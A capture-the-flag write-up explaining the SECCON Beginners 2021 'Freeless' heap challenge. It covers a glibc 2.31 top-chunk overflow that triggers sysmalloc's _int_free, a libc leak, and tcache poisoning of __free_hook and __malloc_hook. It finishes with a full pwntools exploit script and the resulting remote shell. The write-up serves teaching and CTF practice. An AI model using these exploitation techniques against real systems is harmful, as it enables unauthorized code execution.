---
title: 'SECCON Beginners: Freeless (Pwn)'
layout: post
date: '2021-05-24'
tags:
- CTF
- writeup
- SECCON Beginners
- Pwn
comments: true
---

> `free`関数を使わなければUse-after-Freeは発生しないですよね？
>
> `nc freeless.quals.beginners.seccon.jp 9077`
>
> [freeless.tar.gz](/files/freeless.tar.gz) 6bfc2be36c249bf337f074b9229002f531ba0693

Let's just translate the challenge description first.

> Translated by DeepL: If you don't use the free function, Use-after-Free won't occur, right?

In this challenge, we are provided with a tarball. Upon unpacking it, we are presented with the following files.

```
vagrant in pwnbox in /CTF/seccon-beginner-2021
❯ tree freeless
.
├── chall
├── libc-2.31.so
└── main.c
```

How nice, they even provided us with the source code! But let's not get ahead of ourselves. Let's start off by checking what security mitigations are present in the binary.

```
vagrant in pwnbox in /CTF/seccon-beginner-2021/freeless
❯ checksec chall
[*] '/CTF/seccon-beginner-2021/freeless/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Wow, seems like most of the mitigations are enabled. Looks like this will get pretty interesting. Perhaps we should play around with the binary to get a better idea of what it does.

```
vagrant in pwnbox in /CTF/seccon-beginner-2021/freeless
❯ ./chall
1. new
2. edit
3. show
> 1
index: 0
size: 1
1. new
2. edit
3. show
> 2
index: 0
data: AAAAAAAA
1. new
2. edit
3. show
> 3
index: 0
data: AAAAAAAA
1. new
2. edit
3. show
>
[+] bye
```

On the surface, this seems like a pretty standard heap menu challenge, with one exception. We can create new items, edit them, and view them. However, there seems to be no way to delete items.

```
vagrant in pwnbox in /CTF/seccon-beginner-2021/freeless
❯ grep malloc main.c
          note[idx] = (char*)malloc(size);

vagrant in pwnbox in /CTF/seccon-beginner-2021/freeless
❯ grep free main.c

```

Staying true to its name, `free` is not called anywhere within the program source. Well, that might pose a problem since freeing memory is quite essential in heap exploits.

Ideally the approach we'd take would be to first leak a libc address, calculate libc base, then call system/one_gadget by overwriting one of the libc hooks e.g. `__malloc_hook`, `__free_hook` since this is a Full RELRO enabled binary. But let's not get ahead of ourselves.

To begin with, let's play around with the program a little more to identify what bugs we can potentially leverage.

```
pwndbg> r
Starting program: /CTF/seccon-beginner-2021/freeless/chall
1. new
2. edit
3. show
> 1
index: 0
size: 24
1. new
2. edit
3. show
> ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b019ce in __GI___libc_read (fd=0, buf=0x7fffffffe180, nbytes=16) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555758000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x555555758290
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x5555557582b0
Size: 0x20d51

pwndbg> vis 1 0x555555758290

0x555555758290  0x0000000000000000      0x0000000000000021      ........!.......
0x5555557582a0  0x0000000000000000      0x0000000000000000      ................
0x5555557582b0  0x0000000000000000      0x0000000000020d51      ........Q.......         <-- Top chunk

pwndbg> c
Continuing.
2
index: 0
data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
1. new
2. edit
3. show
> ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b019ce in __GI___libc_read (fd=0, buf=0x7fffffffe180, nbytes=16) at ../sysdeps/unix/sysv/linux/read.c:26
26      in ../sysdeps/unix/sysv/linux/read.c

pwndbg> vis 1 0x555555758290

0x555555758290  0x0000000000000000      0x0000000000000021      ........!.......
0x5555557582a0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5555557582b0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA         <-- Top chunk
```

As seen above, we have a heap overflow bug right off the bat.

```c
void readline(char *buf) {
  char c;
  while ((read(0, &c, 1) == 1) && c != '\n')
    *(buf++) = c;
}
```

This vulnerability can be attributed to the buggy `readline` function above, which performs an unbounded read of our input (only stopping when it fails to get input from stdin or upon reading in a newline character).

This is actually a really useful bug for getting our exploit up and running because we can actually leverage on this to regain our ability to `free` chunks. How so? Well since we can overwrite the top chunk, one of the intermediate steps in [House of Orange](https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html) comes to mind. In short, we'll just trigger a call to `sysmalloc` which calls `_int_free`. Confused? No worries, let's break it down.

```
0x555555758290  0x0000000000000000      0x0000000000000021      ........!.......
0x5555557582a0  0x0000000000000000      0x0000000000000000      ................
0x5555557582b0  0x0000000000000000      0x0000000000020d51      ........Q.......         <-- Top chunk
```

First, we need to understand what the top chunk is. The top chunk is essentially the top-most available chunk in a heap which borders the end of available memory. It is not part of any bin, and is instead used to store metadata (remaining available memory) in heap. As seen above, the remaining available memory in the heap is `0x20d50` (note the LSB is used as a `PREV_IN_USE` bit, which indicates whether the previous chunk is in use). Don't take my word for it, let's verify this.

```
0x555555758290  0x0000000000000000      0x0000000000000021      ........!.......
0x5555557582a0  0x0000000000000000      0x0000000000000000      ................
0x5555557582b0  0x0000000000000000      0x0000000000020d51      ........Q.......         <-- Top chunk
pwndbg> vmmap heap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555758000     0x555555779000 rw-p    21000 0      [heap]
pwndbg> p/x 0x555555779000-0x5555557582b0
$1 = 0x20d50
```

As seen above, we've confirmed that `0x20d50` is indeed the size of the remaining available memory in the heap. So what happens when the heap has insufficient memory to service a malloc request? Let's read the glibc 2.31 source code to find out!

```c
# Snippet from glibc 2.31 source malloc/malloc.c

/* ----------- Routines dealing with system allocation -------------- */

/*
    sysmalloc handles malloc cases requiring more memory from the system.
    On entry, it is assumed that av->top does not have enough
    space to service request for nb bytes, thus requiring that av->top
    be extended or replaced.
  */
```

According to the [above comment in the malloc source](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2247), there's a function called `sysmalloc` that will be called when the heap does not contain enough space to service the malloc request.

```c
# Snippet from glibc 2.31 source malloc/malloc.c

old_size = (old_size - MINSIZE) & ~MALLOC_ALIGN_MASK;
set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE);
if (old_size >= MINSIZE)
{
  set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);
  set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));
  set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);
  _int_free (av, old_top, 1);
}
else
{
  set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);
  set_foot (old_top, (old_size + 2 * SIZE_SZ));
}
```

Upon perusing the `sysmalloc` function, we can see that `_int_free` [is indeed called](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2425). As seen above, `_int_free` is called to **free the remaining space in the heap** if it meets the minimum size for a chunk. This is important.

If we recall the heap has `0x20d50` byte of space left, and if we want to trigger `sysmalloc` we need to request more than `0x20d50` bytes via `malloc`. However, this is not possible.

```c
if (size >= 0x1000) {
  print("[-] size too big\n");
} else {
  note[idx] = (char*)malloc(size);
}
```

As seen from the above source code, we aren't allowed to request for more than `0x999` bytes of memory.

```c
#define MAX_NOTE 0x10

char *note[MAX_NOTE];
```

Additionally, we are only allowed to perform up to 16 allocations. Therefore, performing multiple allocations to exhaust `0x20d50` bytes is not an option. Thankfully, we can easily bypass this restriction by overwriting the top chunk size field using the heap overflow bug that we've identified earlier.

```c
# Snippet from glibc 2.31 source malloc/malloc.c

assert ((old_top == initial_top (av) && old_size == 0) ||
      ((unsigned long) (old_size) >= MINSIZE &&
       prev_inuse (old_top) &&
       ((unsigned long) old_end & (pagesize - 1)) == 0));
```

Before we blindly overwrite the top chunk size using our heap overflow bug, there are a couple of restrictions that we have to take note of. With reference to the [above lines](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2379) in the malloc souce, we have to ensure that the top chunk size:

1. Is larger than the minimum chunk size of `0x10`
2. Has the `PREV_INUSE` bit set
3. Is aligned to a page i.e. `top chunk size + allocated size` is a multiple of `0x1000`
    - For example, in a heap with 2 allocated chunks, sized `0x290` and `0x20`, the top chunk size must end in `0x1000 - 0x290 - 0x20 = 0xd50`. Refer to the example below.

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555758000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x555555758290
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x5555557582b0
Size: 0x20d51
```

The more keen-eyed readers might have already observed that a simple way to trim the size while mantaining its validity, is to simply trim off everything except the last 3 nibbles e.g. `0x20d51 -> 0xd51`. Since `0xd51` is less than the max allowed allocation size of `0x1000`, we can request that much memory at one go. So let's try that and see what happens.

```
0x56176779e290  0x0000000000000000      0x0000000000000021      ........!.......
0x56176779e2a0  0x6161616261616161      0x6161616461616163      aaaabaaacaaadaaa
0x56176779e2b0  0x6161616661616165      0x0000000000000d51      eaaafaaaQ.......         <-- Top chunk
```

We start off by using our heap overflow bug to trim the top chunk size. Now let's request for a chunk of size `0xd50`. Although the top chunk size is `0xd50`, it will be unable to service this request. The reason for this will become apparent after we observe what happens next.

```
0x56176779e290  0x0000000000000000      0x0000000000000021      ........!.......
0x56176779e2a0  0x6161616261616161      0x6161616461616163      aaaabaaacaaadaaa
0x56176779e2b0  0x6161616661616165      0x0000000000000d31      eaaafaaa1.......         <-- unsortedbin[all][0]
0x56176779e2c0  0x00007f1cda12fbe0      0x00007f1cda12fbe0      ................
0x56176779e2d0  0x0000000000000000      0x0000000000000000      ................
0x56176779e2e0  0x0000000000000000      0x0000000000000000      ................

---------------------------------TRUNCATED--------------------------------------

0x56176779efd0  0x0000000000000000      0x0000000000000000      ................
0x56176779efe0  0x0000000000000d30      0x0000000000000010      0...............
0x56176779eff0  0x0000000000000000      0x0000000000000011      ................
```

We note that after the allocation, there are 3 new chunks created from the free space of `0xd50`. We have one `0xd30` sized chunk (that has been linked into unsortedbins), and two `0x10` sized chunks. What are these `0x10` sized chunks? Once again, let's consult the glibc source.

```c
# Snippet from glibc 2.31 source malloc/malloc.c

/*
  If not the first time through, we either have a
  gap due to foreign sbrk or a non-contiguous region.  Insert a
  double fencepost at old_top to prevent consolidation with space
  we don't own. These fenceposts are artificial chunks that are
  marked as inuse and are in any case too small to use.  We need
  two to make sizes and alignments work out.
 */
```

As seen from the [above comment](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2665), `sysmalloc` will insert two fencepost chunks at the old_top to prevent consolidation. The two `0x10` sized chunks that we observed are fencepost chunks.

What about the `0xd50` size chunk that we requested for?

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x56176779e000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x56176779e290
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56176779e2b0
Size: 0xd31
fd: 0x7f1cda12fbe0
bk: 0x7f1cda12fbe0

Allocated chunk
Addr: 0x56176779efe0
Size: 0x10

Allocated chunk | PREV_INUSE
Addr: 0x56176779eff0
Size: 0x11

Allocated chunk
Addr: 0x56176779f000
Size: 0x00

pwndbg> version
Gdb:      8.1.1
Python:   3.6.9 (default, Jan 26 2021, 15:33:00)  [GCC 8.4.0]
Pwndbg:   1.1.0 build: f74aa34
```

Notice that pwndbg's `heap` command doesn't seem to detect that new allocation. This is probably a bug, and is present in version `1.1.0 build: f7aa34` as seen above. So we'll have to find it ourself.

```
pwndbg> dq &note
000056176626d040     000056176779e2a0 00005617677bf010
000056176626d050     0000000000000000 0000000000000000
000056176626d060     0000000000000000 0000000000000000
000056176626d070     0000000000000000 0000000000000000

pwndbg> vis 1 0x5617677bf010-0x10

0x5617677bf000  0x0000000000000000      0x0000000000000d51      ........Q.......
0x5617677bf010  0x0000000000000000      0x0000000000000000      ................
0x5617677bf020  0x0000000000000000      0x0000000000000000      ................

pwndbg> vis 1 0x5617677bf010-0x10+0xd50

0x5617677bfd50  0x0000000000000000      0x00000000000212b1      ................         <-- Top chunk
```

Since the challenge binary isn't stripped, we can simply check the note array which keeps track of all the notes we've allocated. As seen above, we've been allocated the `0xd50` chunk that we requested, and the top chunk is now at `0x5617677bfd50`.

```
Allocated chunk | PREV_INUSE (Tcache struct (default))
Addr: 0x56176779e000
Size: 0x291

Allocated chunk | PREV_INUSE (First Note)
Addr: 0x56176779e290
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE (Freed remaining space from initial top)
Addr: 0x56176779e2b0
Size: 0xd31
fd: 0x7f1cda12fbe0
bk: 0x7f1cda12fbe0

Allocated chunk (Fencepost chunk)
Addr: 0x56176779efe0
Size: 0x10

Allocated chunk | PREV_INUSE (Fencepost chunk)
Addr: 0x56176779eff0
Size: 0x11

Allocated chunk | PREV_INUSE (Second Note)
Addr: 0x5617677bf000
Size: 0xd51

Top chunk | PREV_INUSE
Addr: 0x5617677bfd50
Size: 0x212b1
```

The above is a summary of the current state of the heap.

Now that we have a heap chunk that's linked into unsortedbins, we have a libc address on the stack which we can leak i.e. the ForwarD (FD) and BacKward (BK) pointer. We can leak it by leveraging from the `show` function in the program logic.

```c
void print(const char *msg) {
  if (write(1, msg, strlen(msg)) < 0)
    _exit(1);
}
```

With reference to the `print` function in the program source, `show` will continue to print until it encounters a null byte (since `strlen` is used to determine how much printing to do). So all we have to do is to use the heap overflow bug to pad the data (in the first note) all the way until the libc address that we want to leak.

```
0x56176779e290  0x0000000000000000      0x0000000000000021      ........!.......
0x56176779e2a0  0x6161616261616161      0x6161616461616163      aaaabaaacaaadaaa
0x56176779e2b0  0x6161616661616165      0x6161616861616167      eaaafaaa1.......         <-- unsortedbin[all][0]
0x56176779e2c0  0x00007f1cda12fbe0      0x00007f1cda12fbe0      ................
```

Using `show` to print the data of the first note will now allow us to leak `0x7f1cda12fbe0`.

Next, we need to somehow get hold of an arbitrary write primitive that allows us to target `__malloc_hook` or `__free_hook`. Since this is glibc 2.31, the easiest way to achieve this is via _Tcache Poisoning_. To achieve this, we first need to link at least 2 chunks into the same tcachebin. We can do this by leverage on `sysmalloc` as we did before, except we need the freed chunk to fall within the tcachebin range.

```
pwndbg> top_chunk
Top chunk
Addr: 0x560f55a40d50
Size: 0x212b1
```

Fortunately for us, the last 3 nibbles of the current top chunk is `0x2b1`. So when `sysmalloc` is called the free space would be `0x2b0 - 0x10 - 0x10 = 0x290` (we need to account for the 2 fencepost chunks), which means it'd be linked into the `0x290` tcachebin. A request for a `0x2b0` sized chunk should trigger `sysmalloc`, so we'll do just that. However, we have some cleanup to do first.

Before requesting for the `0x2b0` sized chunk, we first have to get the `0xd30` size chunk (the one we used to leak FD) from the unsortedbin. Failing to do so would result in `sysmalloc` not being called as `0x2b0` would simply be _remaindered_ from the `0xd30` unsortedbin chunk.

Let's recap what we have to do:

1. Use heap overflow bug to restore `0xd31` size field that we overwrite to leak the FD pointer.
2. Request for a `0xd30` sized chunk.
3. Trim top chunk size to `0x2b1` by overflowing from the `0xd50` sized allocation (it's right above the top chunk).
3. Request for a `0x2b0` sized chunk to trigger `sysmalloc` and link free space into the `0x290` tcachebin

```
pwndbg> tcachebins
tcachebins
0x290 [  1]: 0x55b8a6635d60 ◂— 0x0

pwndbg> top_chunk
Top chunk
Addr: 0x55b8a66572b0
Size: 0x21d51
```

After performing the above steps, we should have managed to link a chunk into the `0x290` tcachebin as expected. Now we've just got to link another chunk into the `0x290` tcachebin. However, this time we aren't as fortunate as the top chunk size after trimming would be `0xd50`. How do we remedy this? Simple. Just shrink the amount of free space available by requesting a chunk. To ensure that we manage to link `0x290` tcachebin, we need to request a chunk of size `0xd50 - (0x290 + 0x10 + 0x10) = 0xaa0`.

So in summary:

1. Request for a `0xaa0` sized chunk, top chunk size should then be `0x212b1`.
2. Trim top chunk size to `0x2b1` by overflowing from chunk requested in step 1.
3. Request for a `0x2b0` sized chunk to trigger `sysmalloc` and link free space into `0x290` tcachebin

```
pwndbg> tcachebins
tcachebins
0x290 [  2]: 0x56363f628d60 —▸ 0x56363f606d60 ◂— 0x0
```

Awesome! As seen above, we've managed to set things up so that we can perform Tcache Poisoining.

```
pwndbg> vis 2 0x56363f6282c0-0x10

0x56363f6282b0  0x0000000000000000      0x0000000000000aa1      ................
0x56363f6282c0  0x6161616261616161      0x6161616461616163      aaaabaaacaaadaaa
0x56363f6282d0  0x6161616661616165      0x6161616861616167      eaaafaaagaaahaaa
0x56363f6282e0  0x6161616a61616169      0x6161616c6161616b      iaaajaaakaaalaaa
0x56363f6282f0  0x6161616e6161616d      0x616161706161616f      maaanaaaoaaapaaa

---------------------------------TRUNCATED--------------------------------------

0x56363f628d30  0x6175616261746162      0x6177616261766162      batabauabavabawa
0x56363f628d40  0x6179616261786162      0x61626262617a6162      baxabayabazabbba
0x56363f628d50  0x6164626261636262      0x0000000000000291      bbcabbda........
0x56363f628d60  0x000056363f606d60      0x000056363f5e5010      `m`?6V...P^?6V..      <-- tcachebins[0x290][0/2]
```

To achieve an arbitrary write, all we have to do is overflow from the `0xaa0` sized chunk and overwrite the FD pointer (`0x000056363f606d60` with reference to the diagram above) of the tcache chunk with our target address, taking extra care to preserve the `0x291` size field. For instance, suppose we want to write to `0xdeadbeefdeadbeef`, we can simply write that address into the FD pointer. Doing so will result in the following:

```
pwndbg> tcachebins
tcachebins
0x290 [  2]: 0x56363f628d60 —▸ 0xdeadbeefdeadbeef ◂— 0x0
```

From this point on, we can just make two requests for `0x290` sized chunks and they will be allocated from the tcache. The second chunk allocated to us will reside at `0xdeadbeefdeadbeef`. We can then use the `edit` function of the program to let us write whatever value we desire at said address. Hence, we've achieved an arbitrary write.

From this point on we should be able to craft an exploit to spawn a shell on the server.

```python
from pwn import *

HOST = "freeless.quals.beginners.seccon.jp"
PORT = 9077

CHALLENGE = "./chall"
CHALLENGE_LIBC = "libc-2.31.so"
DEBUG_LIBC = "libc-2.31-debug.so"

MENU_PROMPT = "> "
INDEX_PROMPT = "index: "
SIZE_PROMPT = "size: "
DATA_PROMPT = "data: "

DATA_MARKER = "data: "

CURRENT_INDEX = 0

elf = context.binary = ELF(CHALLENGE, checksec=False)

if args.REMOTE:
    io = remote(HOST, PORT)
    libc = ELF(CHALLENGE_LIBC, checksec=False)
    # Use posix_spawn one_gadget (tends to be less finnicky)
    # (https://github.com/david942j/one_gadget/issues/121)
    libc.symbols["one_gadget"] = 0x54F89
    libc.symbols["main_arena"] = libc.sym.__malloc_hook + 0x10
else:
    io = elf.process()
    libc = ELF(DEBUG_LIBC, checksec=False)
    libc.symbols["one_gadget"] = 0xBEEF  # one_gadget wont work with debug libc


def create(size: int) -> int:
    global CURRENT_INDEX

    io.sendlineafter(MENU_PROMPT, str(1))
    io.sendlineafter(INDEX_PROMPT, str(CURRENT_INDEX))
    io.sendlineafter(SIZE_PROMPT, str(size))

    CURRENT_INDEX += 1

    return CURRENT_INDEX - 1


def edit(index: int, data: bytes):
    io.sendlineafter(MENU_PROMPT, str(2))
    io.sendlineafter(INDEX_PROMPT, str(index))
    io.sendlineafter(DATA_PROMPT, data)


def view(index: int) -> bytes:
    io.sendlineafter(MENU_PROMPT, str(3))
    io.sendlineafter(INDEX_PROMPT, str(index))
    io.recvuntil(DATA_MARKER)

    return io.recvline()


def extract_address(leak: bytes) -> int:
    return u64(leak[:6].ljust(8, b"\x00"))


# Stage 1: Trigger _int_free to link free space into unsortedbin chunk

chunk_A = create(0x18)
edit(chunk_A, flat({0x18: p64(0xD51)}))
chunk_B = create(0xD48)

# Stage 2: Leak libc address

edit(chunk_A, cyclic(0x20))
main_arena_96 = extract_address(view(chunk_A)[0x20:])
libc.address = main_arena_96 - (libc.sym.main_arena + 96)

log.success(f"libc @ {hex(libc.address)}")

edit(chunk_A, flat({0x18: p64(0xD31)}))
chunk_C = create(0xD18)

# Stage 3: Trigger _int_free to link free space into tcachebins

edit(chunk_B, flat({0xD48: p64(0x2B1)}))
chunk_D = create(0x2A8)  # Link free space (0x290) into tcachebins

# Stage 4: Trigger _int_free to link another chunk into 0x290 tcachebins

# Current free space is 0x21D51
# So if we want to link another 0x290 sized chunk, we have to shrink
# free space by: 0xD50 - (0x290 + 0x20) = 0xAA0
# Note: 0x20 is for the 2 fencepost chunks placed by sysmalloc
# Free space left will be 0x212B1

chunk_E = create(0xA98)  # Shrink free space to (0x290)
edit(chunk_E, flat({0xA98: p64(0x2B1)}))

chunk_F = create(0x2A8)  # Link free space (0x290) into tcachebins

# At this point, we have to set up the following:
# __free_hook -> one_gadget
# __malloc_hook -> free (this will be used to trigger __free_hook)
#
# Otherwise, one_gadget will segfault when rsp dereferenced during:
# movaps xmmword ptr [rsp + 0x50], xmm0

# Stage 5: Perform tcache poisoning (__free_hook -> one_gadget)

edit(chunk_E, flat({0xA98: p64(0x291)}, p64(libc.sym.__free_hook)))
chunk_G = create(0x288)
chunk_H = create(0x288)

edit(chunk_H, p64(libc.sym.one_gadget))

# Stage 6: Link 2 more chunks into 0x290 tcachebins for another write

chunk_I = create(0xA98)  # Shrink free space to (0x290)
edit(chunk_I, flat({0xA98: p64(0x2B1)}))
chunk_J = create(0x2A8)  # Link free space (0x290) into tcachebins

chunk_K = create(0xA98)  # Shrink free space to (0x290)
edit(chunk_K, flat({0xA98: p64(0x2B1)}))
chunk_L = create(0x2A8)  # Link free space (0x290) into tcachebins

# Stage 7: Perform tcache poisoning (__malloc_hook -> free)

edit(chunk_K, flat({0xA98: p64(0x291)}, p64(libc.sym.__malloc_hook)))
chunk_M = create(0x288)
chunk_N = create(0x288)

edit(chunk_N, p64(libc.sym.free + 8))  # +8 to prevent movaps segfault

# Stage 8: Trigger one_gadget

create(0x18)

io.interactive()
```

Running the above exploit yields us the flag.

```
❯ python xpl.py REMOTE
[+] Opening connection to freeless.quals.beginners.seccon.jp on port 9077: Done
[+] libc @ 0x7fd587d70000
[*] Switching to interactive mode
$ cat flag*
ctf4b{sysmalloc_wh4t_R_U_d01ng???}
```

Flag: `ctf4b{sysmalloc_wh4t_R_U_d01ng???}`

